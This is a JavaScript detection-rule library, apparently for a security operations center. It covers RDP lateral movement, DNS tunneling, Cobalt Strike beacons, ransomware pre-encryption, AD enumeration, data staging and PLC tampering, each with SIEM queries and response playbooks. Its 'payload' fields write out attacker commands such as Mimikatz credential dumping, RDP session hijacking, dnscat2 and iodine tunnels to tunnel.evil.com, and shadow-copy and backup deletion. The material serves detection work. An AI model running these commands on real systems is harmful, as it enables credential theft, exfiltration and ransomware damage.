        truePositive:['RDP from workstation to multiple servers in rapid succession','RDP chain: A→B→C→D (hop pattern)','RDP from external IP to internal server','RDP to domain controller from non-admin workstation','RDP during off-hours to critical infrastructure'],
        falsePositive:['IT admin managing multiple servers via RDP','Help desk using RDP for user support','Authorized jump server usage','Developer accessing dev/test environments'],
        tpIndicators:'RDP chain hopping, targeting DCs/critical servers, off-hours, from non-admin source, preceded by compromise indicators, external source',
        fpIndicators:'From authorized jump server/PAW, IT admin account, during business hours, documented maintenance, single target session',
        investigationSteps:'1. Check if source is authorized jump server\n2. Verify the user account legitimacy\n3. Check for preceding compromise on source\n4. Map all RDP destinations\n5. Check what was done on each RDP target'
    },
    soarAutomation:{
        autoActions:['GeoIP lookup on source IP','Check if source is authorized jump server','Verify user account is admin','Check for preceding failed logins'],
        conditionalActions:['IF external source → Block + investigate immediately','IF targeting DC → High priority alert + verify authorization','IF chain hopping pattern → Lateral movement investigation','IF off-hours + critical targets → IR activation'],
        playbookFlow:'1. Detect RDP pattern → 2. Check authorization → 3. If suspicious: restrict RDP + investigate → 4. Map accessed systems → 5. Check for exfiltration'
    },
    playbook:{
        detection:'Monitor Event 4624 LogonType 10 (RDP). Alert on unusual patterns: multiple targets, chain hopping, critical server access.',
        containment:'1. Block RDP from source IP\n2. Disable the user account\n3. Force logoff all RDP sessions\n4. Check each accessed server for compromise',
        eradication:'1. Map all systems accessed via RDP\n2. Check for persistence on each\n3. Remove any tools/malware deployed\n4. Reset credentials used',
        recovery:'1. Implement RDP restrictions via GPO\n2. Deploy jump servers/PAWs\n3. Enable NLA (Network Level Authentication)\n4. Restrict RDP to authorized sources only'
    },
    policy:'RDP Security: Restrict RDP to jump servers/PAWs only. Enable NLA. Implement MFA for RDP. Disable RDP on servers where not needed. Monitor all RDP sessions.',
    payload:`# RDP lateral movement:
mstsc /v:TARGET
# Credential harvesting during RDP (Mimikatz on session):
sekurlsa::logonpasswords
# RDP hijacking (take over existing session):
tscon SESSION_ID /dest:rdp-tcp#NEW`,
    useCases:['Detect RDP lateral movement chains','Monitor RDP to critical servers','Alert on external RDP access','Detect RDP session hijacking','Track RDP chain hopping'],
    references:['MITRE ATT&CK T1021.001','Microsoft RDP Security','SANS RDP Forensics']
},

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// EXFILTRATION (TA0010) + C2 (TA0011) + IMPACT (TA0040) + DISCOVERY (TA0007) + COLLECTION (TA0009)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'EF-001',name:'Data Exfiltration via DNS Tunneling',category:'Exfiltration',
    mitre:{tactic:'TA0010',technique:'T1048.003',name:'Exfiltration Over DNS'},severity:'High',framework:'Enterprise',
    dataSources:['DNS Logs','Firewall Logs','Sysmon (Event 22)'],
    description:'Detects data exfiltration via DNS tunneling where attackers encode stolen data in DNS queries.',
    queries:{
        splunk:`index=dns | eval query_length=len(query) | eval subdomain_count=mvcount(split(query,".")) | where query_length>50 OR subdomain_count>5 | stats count as QueryCount, avg(query_length) as AvgLen, dc(query) as UniqueQueries by src_ip, query_type | where QueryCount>100 AND AvgLen>40`,
        sentinel:`DnsEvents | extend QueryLength=strlen(Name) | where QueryLength>50 | summarize QueryCount=count(), AvgLength=avg(QueryLength) by ClientIP | where QueryCount>100 and AvgLength>40`,
        qradar:`SELECT sourceip, COUNT(*) as QueryCount, AVG(LENGTH(UTF8(payload))) as AvgLen FROM events WHERE LOGSOURCETYPENAME(logsourceid) LIKE '%DNS%' AND LENGTH(UTF8(payload))>50 GROUP BY sourceip HAVING QueryCount>100 LAST 1 HOURS`,
        elastic:`dns.question.name:/^.{50,}$/ and event.category:"dns" | Threshold: 100+ per source in 1h`,
        wazuh:`<rule id="100901" level="12" frequency="100" timeframe="3600"><if_sid>85001</if_sid><regex>\\w{50,}\\.</regex><description>DNS tunneling detected</description><mitre><id>T1048.003</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=DnsRequest | where strlen(DomainName)>50 | stats count by aid | where count>100`,
        cortex_xdr:`dataset=xdr_data | filter event_type=DNS AND length(action_external_hostname)>50 | comp count() as Queries by agent_ip | filter Queries>100`,
        sentinelone:`EventType="DNS" AND length(DNS)>50 | Group by SrcIP having count()>100 within 1h`
    },
    tpAnalysis:{
        truePositive:['High volume of long DNS queries (50+ chars) to single domain','High Shannon entropy in subdomain labels','Queries with base64/hex encoded data in subdomains','TXT record queries (unusual for normal browsing)','Known DNS tunneling tool patterns (iodine, dnscat2)'],
        falsePositive:['CDN services with long domain names','DKIM/SPF/DMARC records','Microsoft telemetry domains','Certificate transparency queries','Anti-virus cloud lookups'],
        tpIndicators:'High query volume to single domain, long subdomain labels with high entropy, TXT record abuse, known tunneling tool fingerprint, consistent beaconing pattern',
        fpIndicators:'Known CDN/cloud domain, standard DNS query types, matches known telemetry pattern, low entropy in queries',
        investigationSteps:'1. Identify the target DNS domain\n2. Check domain registration and hosting\n3. Calculate entropy of subdomain labels\n4. Check for known tunneling tool signatures\n5. Identify the process making DNS queries\n6. Assess data exposure'
    },
    soarAutomation:{
        autoActions:['Block DNS queries to suspicious domain','Check domain registration/WHOIS','Calculate Shannon entropy of queries','Identify source process','Check domain against threat intel'],
        conditionalActions:['IF known tunneling domain → Block + isolate + forensics','IF high entropy + high volume → Block domain + investigate','IF TXT record abuse → Block TXT queries to domain'],
        playbookFlow:'1. Detect anomalous DNS → 2. Analyze entropy → 3. Block domain → 4. Isolate source → 5. Identify tunneling tool → 6. Assess data exfiltration scope'
    },
    playbook:{
        detection:'DNS tunneling indicators: long queries (50+ chars), high entropy subdomains, high volume to single domain, TXT record queries.',
        containment:'1. Block DNS queries to suspicious domain\n2. Force DNS through internal resolvers\n3. Isolate affected endpoint\n4. Identify tunneling tool\n5. Assess exfiltration scope',
        eradication:'1. Remove DNS tunneling tool\n2. Block C2 domain at DNS level\n3. Add domain to threat intel\n4. Check for persistence mechanisms',
        recovery:'1. Implement DNS query logging\n2. Deploy DNS security (Umbrella, Infoblox)\n3. Block direct DNS to internet\n4. Monitor DNS entropy\n5. Assess data exposure and notify'
    },
    policy:'DNS Security: Force all DNS through internal resolvers. Block direct DNS (port 53) to internet. Implement DNS query logging. Deploy DNS security solutions. Monitor for TXT record abuse.',
    payload:`# iodine: iodined -f 10.0.0.1 tunnel.evil.com / iodine -f tunnel.evil.com
# dnscat2: dnscat2-server tunnel.evil.com / dnscat2 --dns=domain:tunnel.evil.com
# dns2tcp: dns2tcpd -f /etc/dns2tcpd.conf / dns2tcpc -z tunnel.evil.com
# Encoded data in DNS: aGVsbG8gd29ybGQ.tunnel.evil.com TXT`,
    useCases:['Detect DNS tunneling exfiltration','Monitor C2 over DNS','Alert on abnormal DNS patterns','Identify DNS covert channels','Detect iodine/dnscat2/dns2tcp'],
    references:['MITRE ATT&CK T1048.003','SANS DNS Tunneling Detection','InfoBlox DNS Threat Report']
},
{
    id:'C2-001',name:'Cobalt Strike Beacon Detection',category:'Command and Control',
    mitre:{tactic:'TA0011',technique:'T1071.001',name:'Web Protocols C2'},severity:'Critical',framework:'Enterprise',
    dataSources:['Proxy Logs','Network Traffic','JA3/JA3S Fingerprints','EDR Telemetry'],
    description:'Detects Cobalt Strike beacon communication patterns, default HTTP C2 profiles, named pipes, and JA3 fingerprints.',
    queries:{
        splunk:`index=proxy | where match(url,"(?i)(/ca|/dpixel|/__utm\\.gif|/pixel\\.gif|/submit\\.php|/activity)") | stats count as BeaconCount, dc(url) as UniqueURLs by src_ip, dest_ip | where BeaconCount>=10 | append [search index=network ja3_hash="72a589da586844d7f0818ce684948eea" | stats count by src_ip, dest_ip]`,
        sentinel:`CommonSecurityLog | where RequestURL matches regex @"(?i)(/ca|/dpixel|/__utm\\.gif|/pixel|/submit\\.php)" | summarize BeaconCount=count() by SourceIP, DestinationIP, bin(TimeGenerated,5m) | where BeaconCount>=10`,
        qradar:`SELECT sourceip, destinationip, COUNT(*) as BeaconCount FROM events WHERE LOGSOURCETYPENAME(logsourceid) LIKE '%Proxy%' AND (UTF8(payload) ILIKE '%/dpixel%' OR UTF8(payload) ILIKE '%/__utm.gif%' OR UTF8(payload) ILIKE '%/submit.php%') GROUP BY sourceip, destinationip HAVING BeaconCount>=10 LAST 1 HOURS`,
        elastic:`url.path:("/ca" or "/dpixel" or "/__utm.gif" or "/pixel.gif" or "/submit.php") or tls.ja3:"72a589da586844d7f0818ce684948eea"`,
        wazuh:`<rule id="101001" level="15"><if_sid>31100</if_sid><url>/dpixel|/__utm.gif|/pixel.gif|/submit.php</url><description>CRITICAL: Cobalt Strike beacon detected</description><mitre><id>T1071.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=DnsRequest | where DomainName IN (known_cs_domains) OR Event_SimpleName=ProcessRollup2 | where CommandLine MATCHES ".*\\.\\\\pipe\\\\msagent_.*"`,
        cortex_xdr:`dataset=xdr_data | filter event_type=HTTP AND (action_url~="/dpixel|/__utm.gif|/submit.php") OR action_tls_ja3="72a589da586844d7f0818ce684948eea"`,
        sentinelone:`(EventType="HTTP" AND URL MATCHES ".*(dpixel|__utm.gif|submit.php).*") OR (EventType="NamedPipe" AND PipeName MATCHES ".*msagent_.*")`
    },
    tpAnalysis:{
        truePositive:['Regular interval HTTP callbacks (beaconing pattern with jitter)','Default CS URI patterns in proxy logs','Known CS JA3 fingerprint match','CS named pipe patterns (msagent_##, MSSE-###-server)','Malleable C2 profile indicators','Spawn-to process creation (rundll32, dllhost spawned by beacon)'],
        falsePositive:['Google Analytics tracking pixels','Legitimate web analytics URLs','Marketing tracking tools','CDN pixel tracking'],
        tpIndicators:'Periodic callbacks, CS JA3 hash, default URIs, named pipe patterns, spawn-to behavior, small data check-ins at regular intervals',
        fpIndicators:'Google Analytics domain, known marketing platform, inconsistent interval (not beaconing)',
        investigationSteps:'1. Check callback interval pattern (beaconing analysis)\n2. Verify destination IP/domain against CS infrastructure\n3. Check for named pipe creation\n4. Look for spawn-to process behavior\n5. Full network forensics on traffic'
    },
    soarAutomation:{
        autoActions:['Block C2 IP/domain at all egress points','Isolate ALL endpoints communicating with C2','Null-route domain at DNS','Capture network traffic for forensics','Alert IR team immediately'],
        conditionalActions:['IF confirmed CS beacon → Full IR activation + hunt all endpoints','IF multiple beacons detected → Assume advanced adversary + notify leadership','IF domain admin compromise suspected → KRBTGT reset procedure'],
        playbookFlow:'1. Detect beacon → 2. Block C2 infra → 3. Isolate all beaconed endpoints → 4. Full forensics → 5. Hunt environment-wide → 6. Eradicate + rebuild'
    },
    playbook:{
        detection:'CS beacons check in at regular intervals. Look for periodic HTTP/HTTPS connections, default URIs, JA3 hashes, named pipes.',
        containment:'1. Block C2 IP/domain everywhere\n2. Isolate ALL beaconed endpoints\n3. Null-route domain at DNS\n4. Capture network traffic\n5. Engage IR team immediately',
        eradication:'1. Identify all beaconed endpoints\n2. Full forensics on each\n3. Identify initial access\n4. Remove CS artifacts\n5. Check for domain compromise',
        recovery:'1. Re-image all compromised systems\n2. Reset ALL domain credentials if needed\n3. Reset KRBTGT twice\n4. Implement network segmentation\n5. Deploy JA3 monitoring'
    },
    policy:'C2 Detection: Deploy SSL/TLS inspection. Implement JA3/JA3S monitoring. Block known C2 JA3 hashes. Maintain threat intel feeds. Deploy NDR.',
    payload:`# Default CS URIs: /ca, /dpixel, /__utm.gif, /submit.php
# Named Pipes: \\\\.\\pipe\\msagent_##, \\\\.\\pipe\\MSSE-###-server
# JA3: 72a589da586844d7f0818ce684948eea
# User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
# Beacon: Regular interval + jitter → small GET → sleep → POST with results`,
    useCases:['Detect CS beacon HTTP/HTTPS C2','Monitor JA3 fingerprints','Alert on beaconing patterns','Identify CS named pipes','Detect malleable C2 profiles'],
    references:['MITRE ATT&CK T1071.001','The DFIR Report - Cobalt Strike','JA3 Fingerprint Database']
},
{
    id:'IM-001',name:'Ransomware Pre-Encryption Activity',category:'Impact',
    mitre:{tactic:'TA0040',technique:'T1486',name:'Data Encrypted for Impact'},severity:'Critical',framework:'Enterprise',
    dataSources:['Sysmon','Windows Security Logs','EDR','File Integrity Monitoring'],
    description:'Detects pre-encryption ransomware behavior: shadow copy deletion, backup destruction, mass file renaming, recovery disabling.',
    queries:{
        splunk:`index=sysmon EventCode=1 | eval ransomware=case(match(CommandLine,"(?i)(vssadmin.*delete|wmic.*shadowcopy.*delete)"),"Shadow Copy Deletion",match(CommandLine,"(?i)(bcdedit.*safeboot|bcdedit.*recoveryenabled.*no)"),"Recovery Disabled",match(CommandLine,"(?i)(wbadmin.*delete)"),"Backup Deletion",match(CommandLine,"(?i)(cipher.*/w:|sdelete)"),"Secure Wipe",1=1,null()) | where isnotnull(ransomware)`,
        sentinel:`DeviceProcessEvents | where ProcessCommandLine matches regex @"(?i)(vssadmin.*delete|wmic.*shadowcopy.*delete|bcdedit.*recovery.*no|wbadmin.*delete)"`,
        qradar:`SELECT sourceip, username, UTF8(payload) FROM events WHERE UTF8(payload) ILIKE '%vssadmin%delete%shadows%' OR UTF8(payload) ILIKE '%bcdedit%recoveryenabled%No%' OR UTF8(payload) ILIKE '%wbadmin%delete%' LAST 1 HOURS`,
        elastic:`process.command_line:(*vssadmin* and *delete* and *shadows*) or process.command_line:(*bcdedit* and *recoveryenabled* and *No*) or process.command_line:(*wbadmin* and *delete*)`,
        wazuh:`<rule id="101101" level="15"><if_sid>61603</if_sid><field name="win.eventdata.commandLine">vssadmin.*delete|wmic.*shadowcopy.*delete|bcdedit.*recoveryenabled.*No</field><description>CRITICAL: Ransomware pre-encryption activity</description><mitre><id>T1486</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=ProcessRollup2 | where CommandLine MATCHES ".*(vssadmin.*delete|wmic.*shadowcopy|bcdedit.*recovery).*"`,
        cortex_xdr:`dataset=xdr_data | filter action_process_command_line~="vssadmin.*delete|wmic.*shadowcopy|bcdedit.*recovery"`,
        sentinelone:`CmdLine MATCHES ".*(vssadmin.*delete|wmic.*shadowcopy|bcdedit.*recovery).*"`
    },
    tpAnalysis:{
        truePositive:['Multiple pre-encryption commands in rapid succession','Shadow copy deletion followed by mass file renaming','Backup services stopped before file encryption begins','Recovery mode disabled + shadow copies deleted together','Known ransomware binary hash detected'],
        falsePositive:['Legitimate backup rotation scripts','System admin managing VSS','Disk cleanup operations','OS upgrades'],
        tpIndicators:'Multiple pre-encryption commands within minutes, followed by mass file operations, known ransomware indicators, no change ticket',
        fpIndicators:'Single VSS management command, admin account during maintenance, scheduled backup rotation',
        investigationSteps:'1. Check for mass file rename activity (encryption in progress?)\n2. Identify the ransomware variant if possible\n3. Check for data exfiltration (double extortion)\n4. Identify initial access vector\n5. Determine scope of encryption'
    },
    soarAutomation:{
        autoActions:['IMMEDIATELY isolate ALL affected systems','Disable all network shares','Block C2 infrastructure','Notify CISO/IR Commander','Preserve evidence (do NOT power off)'],
        conditionalActions:['IF encryption started → Network-wide share disable + mass isolation','IF data exfiltration detected → Add data breach response procedures','IF domain admin compromised → Full domain compromise response','IF critical systems affected → Business continuity plan activation'],
        playbookFlow:'1. Detect pre-encryption → 2. IMMEDIATE network isolation → 3. Disable shares → 4. Identify variant → 5. Contain spread → 6. Restore from backups → 7. Full rebuild if needed'
    },
    playbook:{
        detection:'Ransomware pattern: disable security → delete backups → disable recovery → encrypt. Detecting steps 1-3 gives time before encryption.',
        containment:'1. IMMEDIATELY isolate ALL affected systems\n2. Disable network shares and mapped drives\n3. Shut down affected systems (preserve evidence)\n4. Block C2 at perimeter\n5. Disable compromised accounts\n6. Notify CISO\n7. DO NOT pay ransom without legal approval',
        eradication:'1. Identify ransomware variant\n2. Determine initial access vector\n3. Map ALL affected systems\n4. Check for double extortion data theft\n5. Remove ransomware from all systems\n6. Close initial access',
        recovery:'1. Restore from clean, verified backups\n2. Rebuild from gold images if needed\n3. Reset ALL domain passwords\n4. Re-enable services in priority order\n5. Monitor for 30 days\n6. Lessons learned'
    },
    policy:'Ransomware Prevention: 3-2-1 backups with air-gapped copy. Protect VSS. Restrict vssadmin/wmic via AppLocker. Network segmentation. Quarterly ransomware exercises.',
    payload:`# Pre-encryption:
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No
wbadmin delete catalog -quiet
net stop "Volume Shadow Copy" /y
# Common extensions: .lockbit .conti .ryuk .revil .blackcat .play .royal .akira`,
    useCases:['Detect shadow copy deletion','Monitor mass file rename (encryption)','Alert on backup destruction','Identify recovery disabling','Detect ransomware process patterns'],
    references:['MITRE ATT&CK T1486','CISA Ransomware Guide','NoMoreRansom Project','The DFIR Report']
},
{
    id:'DI-001',name:'Active Directory Enumeration / BloodHound',category:'Discovery',
    mitre:{tactic:'TA0007',technique:'T1087.002',name:'Domain Account Discovery'},severity:'Medium',framework:'Enterprise',
    dataSources:['Windows Security Logs (4662)','LDAP Logs','DC Logs'],
    description:'Detects AD enumeration by BloodHound/SharpHound, PowerView, ADRecon targeting AD objects, groups, trusts, and ACLs.',
    queries:{
        splunk:`index=wineventlog EventCode=4662 | where match(Properties,"(?i)(groupPolicyContainer|domainDNS|trustedDomain)") | bucket _time span=5m | stats count as LDAPQueries, dc(ObjectName) as UniqueObjects by SubjectUserName, _time | where LDAPQueries>50`,
        sentinel:`SecurityEvent | where EventID==4662 | where Properties has_any ("groupPolicyContainer","domainDNS","trustedDomain") | summarize LDAPQueries=count() by SubjectUserName, bin(TimeGenerated,5m) | where LDAPQueries>50`,
        qradar:`SELECT username, COUNT(*) as LDAPQueries FROM events WHERE "EventID"=4662 GROUP BY username HAVING LDAPQueries>50 LAST 30 MINUTES`,
        elastic:`event.code:"4662" and winlog.event_data.Properties:(*groupPolicyContainer* or *domainDNS* or *trustedDomain*)`,
        wazuh:`<rule id="101201" level="10" frequency="50" timeframe="300"><if_sid>18280</if_sid><description>AD enumeration detected (possible BloodHound)</description><mitre><id>T1087.002</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=LdapQuery | stats count by UserName | where count>50`,
        cortex_xdr:`dataset=xdr_data | filter event_type=LDAP | comp count() as Queries by action_username | filter Queries>50`,
        sentinelone:`EventType="LDAP" | Group by User having count()>50 within 5m`
    },
    tpAnalysis:{
        truePositive:['500+ LDAP queries in 5 minutes from single user','BloodHound ZIP output file created','SharpHound.exe process execution detected','PowerView cmdlets in PowerShell logs','Querying all users, groups, GPOs, trusts simultaneously'],
        falsePositive:['Azure AD Connect synchronization','IT admin tools querying AD','Backup tools enumerating AD','Domain join operations','SCCM client operations'],
        tpIndicators:'High query volume (500+ in 5min), SharpHound process name, BloodHound output files, PowerView cmdlets, querying multiple AD object types',
        fpIndicators:'Known sync account (MSOL_), admin workstation, backup schedule, SCCM client activity',
        investigationSteps:'1. Identify the querying account and source\n2. Check for BloodHound/SharpHound artifacts\n3. Verify if legitimate admin activity\n4. Check if attack paths were subsequently exploited\n5. Assess what was discovered'
    },
    soarAutomation:{
        autoActions:['Identify querying account and source workstation','Check for SharpHound/BloodHound process execution','Verify account against admin whitelist','Alert AD security team'],
        conditionalActions:['IF SharpHound confirmed → Disable account + isolate workstation','IF non-admin account → Investigate compromise','IF followed by privilege escalation → Assume attack path exploitation'],
        playbookFlow:'1. Detect mass LDAP → 2. Check for enum tools → 3. If malicious: disable + remove data → 4. AD security review → 5. Reduce attack surface'
    },
    playbook:{
        detection:'BloodHound/SharpHound generates 500+ LDAP queries in minutes. Event 4662 captures directory access.',
        containment:'1. Disable the enumeration account\n2. Isolate source workstation\n3. Delete any collected data files\n4. Check if attack paths were exploited',
        eradication:'1. Remove BloodHound/SharpHound from endpoint\n2. Delete collected data\n3. Identify initial access\n4. Check if discovered paths were used',
        recovery:'1. Reset compromised account\n2. Implement AD tiering\n3. Reduce AD attack surface\n4. Deploy Defender for Identity\n5. Conduct AD security assessment'
    },
    policy:'AD Security: Monitor high-volume LDAP queries. Deploy Defender for Identity. Audit AD permissions. Implement tiered administration.',
    payload:`# SharpHound: SharpHound.exe -c All -d domain.com
# PowerView: Get-DomainUser; Get-DomainGroup -AdminCount; Get-DomainTrust; Find-LocalAdminAccess
# ADRecon: .\\ADRecon.ps1 -DomainController dc01
# ldapsearch: ldapsearch -x -H ldap://dc01 -b "DC=domain,DC=com" "(objectClass=user)"`,
    useCases:['Detect BloodHound/SharpHound collection','Monitor bulk LDAP enumeration','Alert on PowerView reconnaissance','Identify domain trust enumeration','Detect attack path discovery'],
    references:['MITRE ATT&CK T1087.002','SpecterOps BloodHound','Microsoft Defender for Identity']
},
{
    id:'CO-001',name:'Data Staging for Exfiltration',category:'Collection',
    mitre:{tactic:'TA0009',technique:'T1074.001',name:'Local Data Staging'},severity:'High',framework:'Enterprise',
    dataSources:['Sysmon','EDR File Telemetry','Windows Security Logs'],
    description:'Detects data collection and staging: archiving sensitive files into compressed archives or copying to staging directories before exfiltration.',
    queries:{
        splunk:`index=sysmon EventCode=1 | where match(CommandLine,"(?i)(7z|rar|zip|tar|compress-archive)") AND match(CommandLine,"(?i)(password|secret|confidential|finance|hr|salary|credential|database|backup)") | stats count by Computer, User, CommandLine`,
        sentinel:`DeviceProcessEvents | where ProcessCommandLine matches regex @"(?i)(7z|rar|zip|tar|Compress-Archive)" | where ProcessCommandLine matches regex @"(?i)(password|secret|confidential|finance|credential|database)"`,
        qradar:`SELECT sourceip, username, UTF8(payload) FROM events WHERE (UTF8(payload) ILIKE '%7z%' OR UTF8(payload) ILIKE '%rar%' OR UTF8(payload) ILIKE '%zip%') AND (UTF8(payload) ILIKE '%password%' OR UTF8(payload) ILIKE '%confidential%' OR UTF8(payload) ILIKE '%database%') LAST 24 HOURS`,
        elastic:`process.command_line:(*7z* or *rar* or *zip* or *Compress-Archive*) and process.command_line:(*password* or *confidential* or *database* or *finance*)`,
        wazuh:`<rule id="101301" level="12"><if_sid>61603</if_sid><field name="win.eventdata.commandLine">7z|rar|zip|Compress-Archive</field><description>Data staging: Sensitive files being archived</description><mitre><id>T1074.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=ProcessRollup2 | where FileName IN ("7z.exe","rar.exe","zip.exe") AND CommandLine MATCHES ".*(password|confidential|database|finance).*"`,
        cortex_xdr:`dataset=xdr_data | filter action_process_image_name IN ("7z.exe","rar.exe") AND action_process_command_line~="password|confidential|database"`,
        sentinelone:`SrcProcName IN ("7z.exe","rar.exe","zip.exe") AND CmdLine MATCHES ".*(password|confidential|database).*"`
    },
    tpAnalysis:{
        truePositive:['Password-protected archive creation of sensitive directories','Archiving HR/Finance/Credential data','Staging archives in temp/public directories','Archive creation followed by outbound data transfer','Unusual user archiving sensitive data'],
        falsePositive:['IT backup operations','File migration projects','Database export routines','Developer packaging applications'],
        tpIndicators:'Archiving sensitive keywords, password-protected archive, staging in temp directory, followed by network transfer, unusual user',
        fpIndicators:'IT admin account, scheduled backup, known migration project, internal file server path',
        investigationSteps:'1. Check what files were archived\n2. Verify user authorization for data access\n3. Check if archive was transferred externally\n4. Review data classification of collected files\n5. Check for preceding compromise indicators'
    },
    soarAutomation:{
        autoActions:['Quarantine the staged archive','Block outbound transfers from endpoint','Identify archived file classification','Alert DLP team','Check for preceding compromise'],
        conditionalActions:['IF sensitive data confirmed → Data breach notification prep','IF external transfer detected → Full exfiltration investigation','IF unauthorized user → Account compromise investigation'],
        playbookFlow:'1. Detect staging → 2. Quarantine archive → 3. Block transfers → 4. Classify data → 5. Assess exposure → 6. Notify stakeholders'
    },
    playbook:{
        detection:'Monitor compression tools used on sensitive file paths. Watch for large archives in temp/staging directories.',
        containment:'1. Quarantine staged archive\n2. Block outbound transfers\n3. Identify and isolate user account\n4. Check if exfiltration occurred',
        eradication:'1. Delete staged data archive\n2. Identify all collected files\n3. Check for external exfiltration\n4. Identify attacker access method',
        recovery:'1. Assess data exposure scope\n2. Notify data owners + compliance\n3. Implement DLP policies\n4. Review file access permissions\n5. Enable file access auditing'
    },
    policy:'DLP: Monitor archive creation in temp directories. Implement DLP solutions. Restrict compression tools. Enable file access auditing on sensitive shares.',
    payload:`# Data staging: 7z a -p"password" C:\\temp\\export.7z C:\\HR\\*
# PowerShell: Compress-Archive -Path C:\\Confidential\\* -DestinationPath C:\\Users\\Public\\backup.zip
# Database dump: sqlcmd -S server -Q "BACKUP DATABASE FinanceDB TO DISK='C:\\temp\\finance.bak'"`,
    useCases:['Detect sensitive file archiving','Monitor password-protected archive creation','Alert on data staging in temp directories','Identify database dump creation','Detect bulk file copy to staging'],
    references:['MITRE ATT&CK T1074.001','SANS Data Exfiltration','NIST SP 800-171']
},

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ICS / OT RULES - MITRE ATT&CK for ICS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'ICS-001',name:'Unauthorized PLC Programming / Firmware Change',category:'ICS - Impair Process Control',
    mitre:{tactic:'TA0105',technique:'T0839',name:'Module Firmware'},severity:'Critical',framework:'ICS',
    dataSources:['OT Network Monitor','PLC Logs','Engineering Workstation Logs','SCADA Historian'],
    description:'Detects unauthorized programming or firmware modifications to PLCs (Programmable Logic Controllers), which could alter industrial process behavior and cause physical damage.',
    queries:{
        splunk:`index=ot_network sourcetype=modbus_tcp OR sourcetype=s7comm OR sourcetype=enip
| where function_code IN (5,6,15,16,21,22) OR match(command,"(?i)(write|program|download|upload|firmware)")
| where NOT src_ip IN (authorized_engineering_workstations)
| stats count by src_ip, dest_ip, function_code, _time
| eval Alert=case(function_code IN (21,22),"CRITICAL: Firmware Write",function_code IN (15,16),"Register Write",1=1,"Coil Write")`,
        sentinel:`CommonSecurityLog
| where DeviceVendor=="OT_Monitor"
| where Activity matches regex @"(?i)(write|program|download|firmware)"
| where SourceIP !in (authorized_engineering_ips)
| project TimeGenerated, SourceIP, DestinationIP, Activity, DeviceCustomString1`,
        qradar:`SELECT sourceip, destinationip, UTF8(payload) as OTCommand FROM events WHERE LOGSOURCETYPENAME(logsourceid) LIKE '%OT%' AND (UTF8(payload) ILIKE '%write%' OR UTF8(payload) ILIKE '%program%' OR UTF8(payload) ILIKE '%firmware%') AND sourceip NOT IN (authorized_ips) LAST 1 HOURS`,
        elastic:`event.category:"ot" and event.action:("write" or "program" or "download" or "firmware") and not source.ip:(authorized_engineering_ips)`,
        wazuh:`<rule id="200001" level="15"><if_sid>87001</if_sid><field name="ot_command">write|program|download|firmware</field><description>CRITICAL ICS: Unauthorized PLC programming detected</description><mitre><id>T0839</id></mitre></rule>`,
        crowdstrike:`N/A - Use dedicated OT monitoring (Claroty, Nozomi, Dragos)`,
        cortex_xdr:`dataset=xdr_data | filter event_type=OT_NETWORK AND action_ot_command IN ("write","program","download","firmware") AND src_ip NOT IN (authorized_list)`,
        sentinelone:`N/A - Use dedicated OT monitoring for PLC communications`
    },
    tpAnalysis:{
        truePositive:['PLC programming from unauthorized/unknown IP','Firmware change outside maintenance window','Programming from IT network (should only come from OT engineering workstation)','Multiple PLCs reprogrammed in rapid succession','Logic changes that alter safety interlock behavior'],
        falsePositive:['Scheduled PLC maintenance and updates','Authorized engineering changes with change ticket','PLC vendor remote support session','Commissioning of new equipment'],
        tpIndicators:'Unauthorized source IP, outside maintenance window, no change ticket, from IT network, targeting safety PLCs, multiple PLCs simultaneously',
        fpIndicators:'From authorized engineering workstation, during maintenance window, change ticket exists, vendor support session documented',
        investigationSteps:'1. Verify if change was authorized (check OT change management)\n2. Identify the source workstation\n3. Check if engineering workstation is compromised\n4. Verify PLC logic against known-good baseline\n5. Check safety interlock integrity\n6. Contact OT operations team immediately'
    },
    soarAutomation:{
        autoActions:['Alert OT Security Operations Center (OT-SOC) immediately','Check OT change management system for approval','Identify source workstation and user','Log complete PLC communication session','Compare PLC state to known-good baseline'],
        conditionalActions:['IF no change ticket → EMERGENCY: potential ICS attack, alert plant management','IF from IT network → CRITICAL: IT/OT boundary breach','IF targeting safety PLCs → IMMEDIATE: manual process verification','IF multiple PLCs affected → Possible coordinated attack, activate ICS IR plan'],
        playbookFlow:'1. Detect PLC change → 2. Verify authorization → 3. If unauthorized: alert OT-SOC + block source → 4. Verify PLC state → 5. Restore from backup if tampered → 6. ICS incident response'
    },
    playbook:{
        detection:'OT network monitoring detects Modbus/S7comm/EtherNet/IP write commands from unauthorized sources.',
        containment:'1. DO NOT immediately shut down the PLC (could cause process upset)\n2. Block the unauthorized source at OT firewall\n3. Alert plant operations immediately\n4. Verify process is running safely\n5. Prepare to switch to manual control if needed\n6. Preserve network capture evidence',
        eradication:'1. Verify PLC logic against known-good backup\n2. Restore PLC from trusted backup if tampered\n3. Identify how attacker gained OT access\n4. Check engineering workstation for compromise\n5. Verify all safety interlocks are functional',
        recovery:'1. Restore PLC to known-good state\n2. Verify process operation is normal\n3. Strengthen IT/OT boundary\n4. Update OT firewall rules\n5. Rotate OT credentials\n6. Conduct ICS security assessment'
    },
    policy:'ICS Security: Allow PLC programming only from authorized engineering workstations. Require dual-authorization for PLC changes. Maintain PLC logic backups. Implement OT network monitoring. Enforce IT/OT network segmentation. Follow IEC 62443.',
    payload:`# PLC Attack Methods:
# Modbus write coils: function code 5 (single) / 15 (multiple)
# Modbus write registers: function code 6 (single) / 16 (multiple)
# S7comm PLC program download
# EtherNet/IP CIP write commands
# TRITON/TRISIS targeting Triconex safety controllers
# Industroyer/CrashOverride targeting power grid ICS`,
    useCases:['Detect unauthorized PLC reprogramming','Monitor firmware changes on controllers','Alert on IT-to-OT lateral movement','Identify safety system tampering','Detect TRITON/TRISIS-style attacks','Monitor engineering workstation compromise'],
